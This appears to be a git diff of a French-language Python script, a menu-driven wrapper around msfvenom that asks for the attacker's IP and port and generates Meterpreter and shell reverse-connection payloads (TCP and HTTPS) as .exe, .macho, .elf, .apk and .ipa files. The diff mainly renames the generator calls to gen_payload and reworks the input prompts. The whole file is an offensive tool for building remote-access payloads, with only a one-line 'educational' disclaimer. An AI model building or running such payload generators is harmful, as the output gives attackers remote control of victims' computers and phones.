@@ -13,9 +13,8 @@ def gen_payload(payload, lhost, lport, fmt, outfile):
 def gen_msfvenom():
     # les inputs
     print(f"{Colors.RED}[!]IMPORTANT: Je ne suis pas responsable de ce que tu fais avec ce script, ceci est a but éducatif{Colors.RESET}")
-    LHOST = input("Ton ip?")
-    LPORT = input("Le port?")
-    NAME = input("Le nom?")
+    LHOST = input(f"{Colors.YELLOW}Ton ip?: ")
+    LPORT = input(f"Le port?: {Colors.RESET}")
 
     print(f"{Colors.CYAN}-------MSFVENOM DKP MENU----------")
     print("")
@@ -38,11 +37,11 @@ def gen_msfvenom():
         print(f"[0]: Exit {Colors.RESET}")
         win_choice = input(f"{Colors.ORANGE}Que veut tu en payload Windows?{Colors.RESET}")
         if win_choice == "1":
-            gen_msfvenom("windows/meterpreter/reverse_tcp", LHOST, LPORT, "exe", "payload_win_meter_tcp.exe")
+            gen_payload("windows/meterpreter/reverse_tcp", LHOST, LPORT, "exe", "payload_win_meter_tcp.exe")
         elif win_choice == "2":
-            gen_msfvenom("windows/shell/reverse_tcp", LHOST, LPORT, "exe", "payload_win_shell_tcp.exe")
+            gen_payload("windows/shell/reverse_tcp", LHOST, LPORT, "exe", "payload_win_shell_tcp.exe")
         elif win_choice == "3":
-            gen_msfvenom("windows/meterpreter/reverse_https", LHOST, LPORT, "exe", "payload_win_meter_https.exe")
+            gen_payload("windows/meterpreter/reverse_https", LHOST, LPORT, "exe", "payload_win_meter_https.exe")
         elif win_choice == "0":
             print(f"{Colors.YELLOW}Fin{Colors.RESET}")
             sys.exit(0)
@@ -58,11 +57,11 @@ def gen_msfvenom():
         print(f"[0]: Exit {Colors.RESET}")
         mac_choice = input(f"{Colors.ORANGE}Que veut tu en payload Mac?{Colors.RESET}")
         if mac_choice == "1":
-            gen_msfvenom("osx/x64/meterpreter_reverse_tcp", LHOST, LPORT, "macho", "payload_mac_meter_tcp.macho")
+            gen_payload("osx/x64/meterpreter_reverse_tcp", LHOST, LPORT, "macho", "payload_mac_meter_tcp.macho")
         elif mac_choice == "2":
-            gen_msfvenom("osx/x64/shell_reverse_tcp", LHOST, LPORT, "macho", "payload_mac_shell_tcp.macho")
+            gen_payload("osx/x64/shell_reverse_tcp", LHOST, LPORT, "macho", "payload_mac_shell_tcp.macho")
         elif mac_choice == "3":
-            gen_msfvenom("osx/x64/meterpreter_reverse_https", LHOST, LPORT, "macho", "payload_mac_meter_https.macho")
+            gen_payload("osx/x64/meterpreter_reverse_https", LHOST, LPORT, "macho", "payload_mac_meter_https.macho")
         elif mac_choice == "0":
             print(f"{Colors.YELLOW}Fin{Colors.RESET}")
             sys.exit(0)
@@ -78,11 +77,11 @@ def gen_msfvenom():
         print(f"[0]: Exit {Colors.RESET}")
         lin_choice = input(f"{Colors.ORANGE}Que veut tu en payload Linux?{Colors.RESET}")
         if lin_choice == "1":
-            gen_msfvenom("linux/x64/meterpreter_reverse_tcp", LHOST, LPORT, "elf", "payload_lin_meter_tcp.elf")
+            gen_payload("linux/x64/meterpreter_reverse_tcp", LHOST, LPORT, "elf", "payload_lin_meter_tcp.elf")
         elif lin_choice == "2":
-            gen_msfvenom("linux/x64/shell_reverse_tcp", LHOST, LPORT, "elf", "payload_lin_shell_tcp.elf")
+            gen_payload("linux/x64/shell_reverse_tcp", LHOST, LPORT, "elf", "payload_lin_shell_tcp.elf")
         elif lin_choice == "3":
-            gen_msfvenom("linux/x64/meterpreter_reverse_https", LHOST, LPORT, "elf", "payload_lin_meter_https.elf")
+            gen_payload("linux/x64/meterpreter_reverse_https", LHOST, LPORT, "elf", "payload_lin_meter_https.elf")
         elif lin_choice == "0":
             print(f"{Colors.YELLOW}Fin{Colors.RESET}")
             sys.exit(0)
@@ -99,11 +98,11 @@ def gen_msfvenom():
         print(f"[0]: Exit {Colors.RESET}")
         and_choice = input(f"{Colors.ORANGE}Que veut tu en payload Android?{Colors.RESET}")
         if and_choice == "1":
-            gen_msfvenom("android/meterpreter/reverse_tcp", LHOST, LPORT, "apk", "payload_and_meter_tcp.apk")
+            gen_payload("android/meterpreter/reverse_tcp", LHOST, LPORT, "apk", "payload_and_meter_tcp.apk")
         elif and_choice == "2":
-            gen_msfvenom("android/shell/reverse_tcp", LHOST, LPORT, "apk", "payload_and_shell_tcp.apk")
+            gen_payload("android/shell/reverse_tcp", LHOST, LPORT, "apk", "payload_and_shell_tcp.apk")
         elif and_choice == "3":
-            gen_msfvenom("android/meterpreter/reverse_https", LHOST, LPORT, "apk", "payload_and_meter_https.apk")
+            gen_payload("android/meterpreter/reverse_https", LHOST, LPORT, "apk", "payload_and_meter_https.apk")
         elif and_choice == "0":
             print(f"{Colors.YELLOW}Fin{Colors.RESET}")
             sys.exit(0)
@@ -120,11 +119,11 @@ def gen_msfvenom():
         print(f"[0]: Exit {Colors.RESET}")
         ios_choice = input(f"{Colors.ORANGE}Que veut tu en payload IOS?{Colors.RESET}")
         if ios_choice == "1":
-            gen_msfvenom("apple_ios/aarch64/meterpreter_reverse_tcp", LHOST, LPORT, "ipa", "payload_ios_meter_tcp.ipa")
+            gen_payload("apple_ios/aarch64/meterpreter_reverse_tcp", LHOST, LPORT, "ipa", "payload_ios_meter_tcp.ipa")
         elif ios_choice == "2":
-            gen_msfvenom("apple_ios/aarch64/shell_reverse_tcp", LHOST, LPORT, "ipa", "payload_ios_shell_tcp.ipa")
+            gen_payload("apple_ios/aarch64/shell_reverse_tcp", LHOST, LPORT, "ipa", "payload_ios_shell_tcp.ipa")
         elif ios_choice == "3":
-            gen_msfvenom("apple_ios/aarch64/meterpreter_reverse_https", LHOST, LPORT, "ipa", "payload_ios_meter_https.ipa")
+            gen_payload("apple_ios/aarch64/meterpreter_reverse_https", LHOST, LPORT, "ipa", "payload_ios_meter_https.ipa")
         elif ios_choice == "0":
             print(f"{Colors.YELLOW}Fin{Colors.RESET}")
             sys.exit(0)
